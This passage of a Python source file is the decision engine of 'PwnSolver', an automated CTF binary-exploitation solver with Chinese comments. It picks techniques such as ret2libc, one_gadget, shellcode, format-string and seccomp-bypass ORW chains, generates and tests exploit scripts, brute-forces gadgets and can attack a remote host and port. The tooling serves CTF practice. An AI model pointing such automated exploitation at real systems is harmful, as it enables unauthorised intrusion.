                 f" (glibc {self.libc_version})，gadget 已按新 libc 重建")
        return True

    def solve(self, use_strategy=True):
        """主入口 — 完整决策链:
        ① libc? → ② 漏洞类型? → ③ 简单方法? → ④ 组合利用? → ⑤ 爆破? → ⑥ 诊断
        """
        self.log("\n" + "=" * 65)
        self.log(" PwnSolver — 自动PWN解题决策链")
        self.log("=" * 65)

        try:
            # ====== Step 0: libc/ld 已在 __init__ 里定好（离线优先），这里只做提示 ======
            if self.libc_path:
                origin = {'user': '用户指定 -l', 'sibling': '同目录附件',
                          'neighbor': '上级目录附件', 'index': '本地符号索引',
                          'system': '系统 libc 兜底'}.get(self.libc_source, self.libc_source)
                suffix = f" [glibc {self.libc_version}]" if self.libc_version else ""
                self.log(f"\n 🔍 libc: {os.path.basename(self.libc_path)}{suffix} ({origin})")
                if self.libc_suspect:
                    self.log("    ⚠ 系统兜底 libc 只保证本地自测；远程利用前用 -l 换靶机 libc")
            else:
                self.log("\n 🔍 libc: 未找到（无附件、索引无匹配）→ 可跑 pwnsolver.py libcdb build 扩充索引")

            # ====== Step 1: 基础分析 ======
            analysis = self.analyze()
            if not analysis:
                return False
            gadgets = self.find_gadgets()
            vuln_type = self.determine_vuln_type(analysis, gadgets)

            # reverse-skill: 漏洞类型确定后生成 playbook
            if self.enable_reverse_skill:
                self.build_reverse_playbook(analysis, gadgets)

            funcs = analysis.get('functions', {})
            protections = analysis.get('protections', {})
            plt = gadgets.get('plt', {})

            # ====== Step 2: 决策摘要 ======
            self.log("\n" + "─" * 50)
            self.log(" 📋 决策摘要")
            self.log("─" * 50)
            self.log(f" ① libc: {'已提供' if self.libc_path else '⚠ 未提供(将用LibcSearcher)'}")
            self.log(f" ② 类型: {vuln_type[0]} (置信度{vuln_type[1]})")
            self.log(f"    保护: NX={protections.get('nx')} PIE={protections.get('pie')} Canary={protections.get('canary')}")
            self.log(f"    危险: {[f[0] for f in funcs.get('dangerous', [])[:5]]}")
            self.log(f"    Win:   {[f[0] for f in funcs.get('win', [])[:3]]}")
            self.log(f" ③ 简单方法:")
            simple_methods = []
            if funcs.get('win'):
                simple_methods.append(f"ret2win({funcs['win'][0][0]})")
            if gadgets.get('one_gadgets'):
                simple_methods.append(f"one_gadget({len(gadgets['one_gadgets'])}个)")
            if not protections.get('nx'):
                simple_methods.append("shellcode")
            if 'printf' in plt or 'sprintf' in plt:
                simple_methods.append("format_string")
            self.log(f"    可用: {simple_methods or '无 → 需组合利用'}")

            # 检查多要素（reverse-skill DeepRecon 的 libseccomp 证据也计入）
            has_seccomp = self._check_seccomp(gadgets) or (analysis.get('reverse_intel') or {}).get('anti_analysis', {}).get('seccomp', False)
            has_heap = any(f in plt for f in ['malloc', 'free', 'calloc'])
            has_overflow = bool([f for f in funcs.get('dangerous', [])
                               if 'gets' in str(f) or 'read' in str(f) or 'memcpy' in str(f)])
            has_array_overflow = (funcs.get('array_overflow') or {}).get('array_overflow', False)
            has_prng = (funcs.get('prng_info') or {}).get('prng_detected', False)
            has_stack_pivot = (funcs.get('stack_pivot') or {}).get('stack_pivot', False)
            packed = (funcs.get('packed') or {}).get('packed', False)
            anti = funcs.get('anti_analysis') or {}
            lang = funcs.get('reverse_language') or {}

            combo = []
            if has_seccomp: combo.append("seccomp→需ORW")
            if has_heap and has_overflow: combo.append("栈+堆组合")
            if 'printf' in plt and has_overflow: combo.append("fmt+溢出组合")
            if has_array_overflow: combo.append("数组溢出→GOT覆写")
            if has_prng: combo.append("PRNG种子可爆破")
            if has_stack_pivot: combo.append("栈迁移可用")
            if funcs.get('is_go_binary'): combo.append("Go binary (syscall)")
            if lang.get('go'): combo.append("Go 符号恢复")
            if lang.get('rust'): combo.append("Rust 字符串驱动分析")
            if packed: combo.append(f"packed: {funcs.get('packed', {}).get('packer') or 'unknown'}")
            if anti.get('anti_analysis'): combo.append("反分析绕过")
            if anti.get('seccomp'): combo.append("seccomp(syscall filter)")
            if combo:
                self.log(f" ④ 组合: {', '.join(combo)}")

            # 协议型/堆型 + seccomp 的题目当前没有全自动 exploit：
            # 与其让 ORW/one_gadget/ROP 浪费时间，不如直接产出结构化诊断。
            pattern_ids = {m.get('pattern_id') if isinstance(m, dict) else getattr(m, 'pattern_id', None) for m in (analysis.get('pattern_matches') or [])}
            if has_seccomp and 'protobuf_protocol' in pattern_ids:
                self.log("\n[!] protobuf-c + seccomp challenge detected.")
                self.log("    Current engine cannot recover ProtobufCMessageDescriptor semantics automatically.")
                self.log("    Run: python3 pwnsolver.py recon ./pwn --deep-r2 and inspect the descriptor.")
                self._print_failure(analysis, gadgets, vuln_type)
                return False
            if has_seccomp and vuln_type[0] == 'heap':
                self.log("\n[!] heap-menu + seccomp challenge detected.")
                self.log("    Generic ORW stack engine is not applicable; needs heap layout/FSOP (House of Apple) chain.")
                self.log("    Recon evidence and playbook have been generated for manual exploitation.")
                self._print_failure(analysis, gadgets, vuln_type)
                return False

            # ====== Step 3: 简单方法优先 ======
            self.log(f"\n ③ 尝试简单方法...")


            # 3a0: reverse-skill 签名的 BadBoy array-OOB / yes_or_no（优先于通用栈方法）
            if vuln_type[0] == 'array_oob' and vuln_type[1] >= 90:
                self.log("  尝试 BadBoy 数组越界利用 (stack/libc leak + puts@got 覆写)...")
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("array_oob (BadBoy)")
                    return True
            if vuln_type[0] == 'yes_or_no' and vuln_type[1] >= 90:
                self.log("  尝试 yes_or_no 抬栈 + one_gadget...")
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit(timeout=30):
                    self._print_success("yes_or_no + one_gadget")
                    return True
            if vuln_type[0] == 'orange_cat' and vuln_type[1] >= 95:
                self.log("  尝试 orange_cat_diary House of Orange + fastbin...")
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit(timeout=40):
                    self._print_success("orange_cat_diary (House of Orange + fastbin)")
                    return True

            # 3a: ret2win — 最简单
            if vuln_type[0] == 'ret2win' and vuln_type[1] >= 80:
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("ret2win")
                    return True

            # 3a2: ret2syscall (binary有syscall+pop_rax+pop_rdi时优先，不需要libc)
            specific = gadgets.get('specific', {})
            has_syscall_gadgets = specific.get('syscall') and specific.get('pop_rax') and specific.get('pop_rdi')
            if has_syscall_gadgets and has_overflow:
                self.log("  尝试ret2syscall (binary内gadget, 无需libc)...")
                self.vuln_type = ('ret2syscall', 88, 'binary有完整syscall链')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("ret2syscall (binary gadgets)")
                    return True

            # 3b: one_gadget (无seccomp时)
            if gadgets.get('one_gadgets') and not has_seccomp:
                self.vuln_type = ('one_gadget', 95, '')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("one_gadget")
                    return True

            # 3c: shellcode (NX禁用时)
            if not protections.get('nx', True) and has_overflow:
                self.vuln_type = ('shellcode', 90, '')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("shellcode")
                    return True

            # 3d: format string
            if 'printf' in plt:
                self.vuln_type = ('format_string', 70, '')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("format_string")
                    return True

            # ====== Step 4: 组合/高级方法 ======
            self.log(f"\n ④ 简单方法失败 → 尝试组合/高级方法")

            # 4a: seccomp → ORW
            if has_seccomp:
                self.log("  检测到seccomp → ORW引擎")
                if self._try_auto_orw(analysis, gadgets):
                    self._print_success("ORW (seccomp绕过)")
                    return True

            # 4b: ret2libc (有libc+pop_rdi)
            pop_rdi_ok = gadgets.get('pop_rdi_in_binary', False)
            if pop_rdi_ok and has_overflow and self.libc_path:
                self.vuln_type = ('ret2libc', 80, '')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("ret2libc")
                    return True

            # 4c: ret2syscall (fallback, 使用exploit模板)
            if specific.get('syscall') and specific.get('pop_rax') and specific.get('pop_rdi'):
                self.log("  尝试ret2syscall (exploit模板)...")
                self.vuln_type = ('ret2syscall', 75, 'fallback')
                code = self.generate_exploit(analysis, gadgets)
                if code and self.test_exploit():
                    self._print_success("ret2syscall")
                    return True
            # 4d: setcontext+ORW (Heap_Harmony_Festivity风格)
            heap_menu = analysis.get('heap_menu') or funcs.get('heap_menu') or {}
            if heap_menu.get('heap_menu') and self.libc_path:
                self.log("  检测到堆菜单 → setcontext+ORW链")
                try:
                    from orw_engine import CombinedStrategyEngine
                    engine = CombinedStrategyEngine(self, verbose=self.verbose)
                    methods = engine.plan_methods(analysis, gadgets)
                    # 查找setcontext_orw方法
                    for m in methods:
                        if m['name'] == 'setcontext_orw':
                            result = engine._try_setcontext_orw(m)
                            if result:
                                self.log(f"  [+] setcontext+ORW链已就绪 — 需配合堆利用使用")
                                self.log(f"      链长度: {len(result.get('chain', b''))} bytes")
                            break
                except Exception as e:
                    self.log(f"  setcontext+ORW失败: {e}")

            # 4e: StackPivot + OneGadget (pwn5_x/yes_or_no风格)
            # 需: one_gadget + 无canary + (栈迁移或有溢出)
            if gadgets.get('one_gadgets') and not protections.get('canary') and (has_stack_pivot or has_overflow):
                self.log("  检测到无canary+溢出/栈迁移 → StackPivot+OG爆破")
                try:
                    self.vuln_type = ('stack_pivot', 75, 'StackPivot+OG')
                    code = self.generate_exploit(analysis, gadgets)
                    if code and self.test_exploit(timeout=20):
                        self._print_success("StackPivot+OneGadget")
                        return True
                    self.log("  StackPivot exploit未成功，尝试bruteforce...")
                except Exception as e:
                    self.log(f"  StackPivot失败: {e}")

            # 4f: one_gadget bruteforce (yes_or_no fallback)
            if gadgets.get('one_gadgets') and has_stack_pivot:
                self.log("  检测到栈迁移 → one_gadget爆破 (yes_or_no风格)")
                try:
                    clearing = self.gadget_finder.find_register_clearing_gadgets()
                    if clearing:
                        self.log(f"  寄存器清除: {list(clearing.keys())}")
                        from bruteforcer import BruteForcer
                        bf = BruteForcer(self.binary_path, verbose=self.verbose)

                        # Default success check: try echo PWNED_OK
                        def default_check(p):
                            try:
                                p.sendline(b'echo PWNED_OK')
                                import time
                                time.sleep(0.3)
                                return b'PWNED_OK' in p.recv(timeout=2)
                            except Exception:
                                return False

                        result = bf.brute_one_gadget_with_constraints(
                            one_gadgets=gadgets['one_gadgets'],
                            clearing_gadgets=clearing,
                            success_check=default_check,
                            max_attempts=256,
                        )
                        if result:
                            self._print_success("one_gadget爆破 (yes_or_no风格)")
                            return True
                except Exception as e:
                    self.log(f"  OG爆破失败: {e}")

            # 4f: 组合 — libc leak + one_gadget
            if gadgets.get('one_gadgets') and pop_rdi_ok:
                self.log("  组合: leak libc → one_gadget")
                # 尝试用ret2libc泄露+one_gadget跳转
                # (这需要更复杂的逻辑，当前fallback到爆破)

            # ====== Step 5: 爆破 ======
            self.log(f"\n ⑤ 组合方法失败 → 进入爆破/诊断模式")
            if use_strategy:
                from bruteforcer import StrategyEngine
                engine = StrategyEngine(self)
                result = engine.execute()
                if result:
                    self._print_success("爆破")
                    return True

            # ====== Step 6: 自适应求解器 (反馈闭环) ======
            self.log(f"\n ⑥ 爆破失败 → 启动自适应求解器 (反馈闭环)")
            try:
                from adaptive_solver import AdaptiveSolver, AdaptiveConfig
                config = AdaptiveConfig(
                    max_total_attempts=50,
                    max_attempts_per_method=12,
                    verbose=self.verbose,
                )
                adaptive = AdaptiveSolver(self, config)
                if adaptive.solve(analysis, gadgets):
                    self._print_success("自适应求解器")
                    return True
                self.log("  自适应求解器未成功")
            except ImportError as e:
                self.log(f"  自适应求解器不可用: {e}")
            except Exception as e:
                self.log(f"  自适应求解器异常: {e}")

            # ====== Step 7: 诊断 ======
            self._print_failure(analysis, gadgets, vuln_type)
            return False

        except Exception as e:
            self.log(f"\n[!] 错误: {e}")
            import traceback
            traceback.print_exc()
            return False

    def _print_success(self, method):
        self.log("\n" + "★" * 40)
        self.log(f"★ ✅ 解题成功! (方法: {method})")
        self.log("★" * 40)

    def _print_failure(self, analysis, gadgets, vuln_type):
        self.log("\n" + "─" * 50)
        self.log(" 📋 失败诊断")
        self.log("─" * 50)
        protections = analysis.get('protections', {})
        self.log(f"  类型: {vuln_type[0]}")
        self.log(f"  保护: NX={protections.get('nx')} PIE={protections.get('pie')} Canary={protections.get('canary')}")
        self.log(f"  pop_rdi: {gadgets.get('pop_rdi_in_binary', False)}")
        self.log(f"  one_gadgets: {len(gadgets.get('one_gadgets', []))}")
        self.log(f"  ROP gadgets: {len(gadgets.get('rop_gadgets', []))}")
        seccomp = self._check_seccomp(gadgets)
        if seccomp: self.log(f"  seccomp: YES → 需要ORW (open/read/write)")
        if protections.get('pie'): self.log(f"  PIE: YES → 需要基址泄露")
        if protections.get('canary'): self.log(f"  Canary: YES → 需要canary泄露")
        # libc 状态：不再提"pip install LibcSearcher"（离线环境下那是死路）
        if not self.libc_path:
            self.log("  libc: 未找到 → 离线做法：pwnsolver.py libcdb build 扩索引，"
                     "或用 -l 显式指定靶机 libc")
        elif self.libc_suspect:
            self.log("  libc: 来自本机系统兜底 → 本地自测可以，远程会算错偏移，"
                     "请用 -l 换成靶机 libc")
        elif self.libc_version:
            self.log(f"  libc: glibc {self.libc_version}（{self.libc_source}）")
        self.log(f"\n  下一步: {self._next_step_advice(vuln_type[0], analysis, gadgets, seccomp)}")

    def _next_step_advice(self, vuln, analysis, gadgets, seccomp=False):
        """按题型给可执行的下一步，替代原先写死的 'gcc -static'。"""
        advice = {
            'format_string': "格式化字符串：先确认 %N$p 的偏移与写入目标（GOT / 全局变量 / 返回地址），"
                             "再构造 %n/%hhn 分块写；本轮的探测脚本已在 exploits/ 里，可直接手工改",
            'heap': "堆题：确认菜单选项与 free/calloc 计数、指针数组地址、libc 版本，"
                    "按 UAF/重复free → unsorted bin 泄露 → tcache dup → 目标(__free_hook / "
                    "tcache 结构 / FSOP) 顺序手写；结构化诊断见 pwnsolver_evidence/*.heap.md",
            'go_stack': "Go 栈溢出：确认 pattern_matches 里有 go_stack_overflow 及其 frame 参数，"
                        "GoStackExploit 需要该参数才能算帧偏移",
            'orange_cat': "House of Orange：确认给了配对 libc（-l libc-2.23.so）与 loader（-d ld-2.23.so），"
                          "并检查 show() 泄露路径是否被走到",
            'array_oob': "数组越界读写：确认有符号索引边界与可利用的负索引写目标（如 puts@got）",
            'yes_or_no': "yes_or_no 风格：确认抬栈次数与寄存器清除 gadget 组合，必要时手工爆破",
            'ret2syscall': "ret2syscall：确认 binary 内 syscall/pop rax/rdi 链完整，"
                           "或改用 libc 内的 execve 链",
            'shellcode': "shellcode：确认 NX 关闭且注入段可执行（栈/堆权限）",
            'stack_pivot': "栈迁移：确认 leave;ret 与目标栈地址可控（通常需要泄露）",
        }.get(vuln)
        if not advice:
            advice = ("栈类利用：核对 offset / canary / 栈对齐；远程务必确认 libc 版本配对；"
                      "先跑 pwnsolver.py recon <bin> --deep-r2 看证据")
        if seccomp:
            advice += "；有 seccomp → 目标链改成 ORW(open/read/write) 或 FSOP"
        return advice

    def _check_seccomp(self, gadgets):
        """检测是否有seccomp限制"""
        plt = gadgets.get('plt', {})
        seccomp_funcs = ['seccomp_init', 'seccomp_load', 'seccomp_rule_add']
        return any(f in plt for f in seccomp_funcs)

    def _try_auto_orw(self, analysis, gadgets):
        """自动尝试ORW绕过seccomp"""
        try:
            from orw_engine import ORWEngine
            self.log("\n[*] 自动ORW引擎启动...")

            orw = ORWEngine(self.binary_path,
                          libc_path=self.libc_path,
                          verbose=self.verbose)

            # 估算偏移量
            buffers = analysis.get('buffers', [])
            offset = 0x40
            for b in buffers:
                if b['type'] == 'stack_frame' and 0x10 <= b['size'] <= 0x200:
                    offset = b['size'] + 8
                    break

            code = orw.generate_exploit(offset=offset)
            if not code:
                self.log("[-] ORW生成失败，缺少gadgets")
                return False

            # 保存并测试
            import tempfile, subprocess, time
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(code)
                tmp_path = f.name

            try:
                self.log("[*] 测试ORW exploit...")
                result = subprocess.run(
                    [exploit_python(), tmp_path],
                    capture_output=True, text=True, timeout=15,
                    cwd=os.path.dirname(os.path.abspath(self.binary_path)) or '.'
                )
                output = result.stdout + result.stderr
                success = 'flag' in output.lower() or 'CTF' in output or '{' in output
                if success:
                    self.log("[+] ORW exploit成功!", 'success')
                    print(output)
                    return True
                else:
                    self.log(f"[-] ORW测试: {output[:200]}")
            finally:
                try: os.unlink(tmp_path)
                except: pass

        except ImportError:
            self.log("[-] ORW引擎模块不可用")
        except Exception as e:
            self.log(f"[-] ORW异常: {e}")

        return False

    def save_exploit_script(self, output_path=None):
        """保存生成的exploit脚本到 exploits/ 文件夹"""
        if not self.exploit or not self.exploit.code:
            self.log("  [-] 没有可保存的exploit")
            return None

        # 创建 exploits 目录
        exploits_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'exploits')
        os.makedirs(exploits_dir, exist_ok=True)

        if output_path is None:
            # 带时间戳的文件名
            import datetime
            ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            base = os.path.basename(self.binary_path)
            output_path = os.path.join(exploits_dir, f"exploit_{base}_{ts}.py")
        elif not os.path.isabs(output_path):
            output_path = os.path.join(exploits_dir, output_path)

        with open(output_path, 'w') as f:
            f.write(self.exploit.code)

        self.log(f"  [+] Exploit已保存到: {output_path}")
        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='PwnSolver - 便携式自动PWN解题器',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  %(prog)s ./challenge                    # 本地解题
  %(prog)s ./challenge -l libc.so.6       # 指定libc
  %(prog)s ./challenge -r 127.0.0.1 9999  # 远程解题
  %(prog)s ./challenge -o exploit.py      # 输出exploit到文件
        """
    )
    parser.add_argument('binary', help='目标二进制文件路径')
    parser.add_argument('-l', '--libc', help='libc文件路径')
    parser.add_argument('-d', '--ld', help='自定义ld-linux加载器路径(本地libc版本不匹配时)')
    parser.add_argument('-r', '--remote', nargs=2, metavar=('HOST', 'PORT'),
                        help='远程目标 (host port)')
    parser.add_argument('-o', '--output', help='输出exploit脚本路径')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='测试超时(秒)')
    parser.add_argument('-q', '--quiet', action='store_true',
                        help='静默模式')
    parser.add_argument('--interactive', action='store_true',
                        help='解题成功后进入交互shell')
    parser.add_argument('--shell-only', action='store_true',
                        help='仅运行最新exp并进入交互shell(不重新解题)')
    parser.add_argument('--no-skill', action='store_true',
                        help='关闭 reverse-skill 增强（仅保留原有 PwnSolver 逻辑）')
    parser.add_argument('--no-adaptive', action='store_true',
                        help='禁用自适应求解器 (solve --no-adaptive)')
    parser.add_argument('--skill-root', default=None,
                        help='reverse_skill 目录路径（默认: 仓库根目录/reverse_skill）')
    parser.add_argument('--recon-only', action='store_true',
                        help='仅执行基础分析 + reverse-skill 深度侦察 + playbook 后退出')
    parser.add_argument('--recon-workdir', default=None,
                        help='recon evidence 输出目录（默认: 二进制目录）')
    parser.add_argument('--deep-r2', action='store_true',
                        help='DeepRecon 额外运行 r2 aaa 函数级分析')

    args = parser.parse_args()

    # Shell-only模式: 直接运行exp并交互
    if args.shell_only:
        _run_shell_only(args)
        return

    remote = tuple(args.remote) if args.remote else None

    solver = PwnSolver(
        binary_path=args.binary,
        libc_path=args.libc,
        ld_path=args.ld,
        remote=remote,
        verbose=not args.quiet,
        enable_reverse_skill=not args.no_skill,
        skill_root=args.skill_root,
        recon_workdir=args.recon_workdir,
        deep_r2_analysis=args.deep_r2,
    )
    # 注入超时配置
    solver._test_timeout = args.timeout

    if args.recon_only:
        _run_recon_only(solver)
        return

    success = solver.solve()

    if args.output:
        solver.save_exploit_script(args.output)

    # 总是保存一份
    exp_path = solver.save_exploit_script()

    # 交互模式
    if args.interactive and success and exp_path:
        print(f"\n{'='*50}")
        print(f"💻 进入交互Shell (运行: {exp_path})")
        print(f"{'='*50}")
        env = os.environ.copy()
        if remote:
            env['PWN_REMOTE_HOST'] = remote[0]
            env['PWN_REMOTE_PORT'] = str(remote[1])
            print(f"🌐 远程目标: {remote[0]}:{remote[1]}")
        subprocess.run([sys.executable, exp_path], cwd=os.path.dirname(exp_path) or '.', env=env)

    sys.exit(0 if success else 1)


def _run_recon_only(solver):
    """--recon-only: 分析 + gadgets + 漏洞判断 + playbook，不进入 exploit 测试。"""
    print()
    print("=" * 60)
    print(" PwnSolver reverse-skill 侦察模式")
    print("=" * 60)
    analysis = solver.analyze()
    gadgets = solver.find_gadgets()
    solver.determine_vuln_type(analysis, gadgets)
    playbook = solver.build_reverse_playbook(analysis, gadgets)

    if playbook and playbook.get('markdown_path'):
        print()
        print(f"Playbook: {playbook['markdown_path']}")
    elif playbook:
        print()
        print(playbook.get('markdown', ''))

    intel = analysis.get('reverse_intel') or {}
    evidence = analysis.get('reverse_evidence') or {}
    print()
    print("Recon evidence:")
    print(json.dumps(evidence, ensure_ascii=False, indent=2))
    print()
    print(f"结论: vuln_type={solver.vuln_type[0] if solver.vuln_type else 'unknown'}, "
          f"packed={intel.get('packed', {}).get('packed')}, "
          f"go={intel.get('language', {}).get('go')}, "
          f"rust={intel.get('language', {}).get('rust')}, "
          f"anti_analysis={intel.get('anti_analysis', {}).get('anti_analysis')}")


def _run_shell_only(args):
    """仅运行exp并交互。支持 -r host port 远程验证"""
    exploits_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'exploits')
    if not os.path.exists(exploits_dir):
        print("exploits/ 目录不存在，请先解题生成exp")
        sys.exit(1)

    binary = args.binary
    base = os.path.basename(binary) if binary else ""

    exps = sorted(
        [f for f in os.listdir(exploits_dir) if f.endswith('.py')],
        key=lambda f: os.path.getmtime(os.path.join(exploits_dir, f)),
        reverse=True
    )

    if not exps:
        print("没有找到exp文件")
        sys.exit(1)

    # 优先匹配当前binary
    matching = [f for f in exps if base and base in f]
    exp_name = matching[0] if matching else exps[0]
    exp_path = os.path.join(exploits_dir, exp_name)

    # 远程模式: 通过环境变量注入目标地址
    env = os.environ.copy()
    remote = getattr(args, 'remote', None)
    if remote:
        env['PWN_REMOTE_HOST'] = remote[0]
        env['PWN_REMOTE_PORT'] = str(remote[1])
        print(f"🌐 远程目标: {remote[0]}:{remote[1]}")
    print(f"运行exp: {exp_name}")
    try:
        subprocess.run([sys.executable, exp_path], cwd=exploits_dir, env=env)
    except Exception as e:
        print(f"运行失败: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
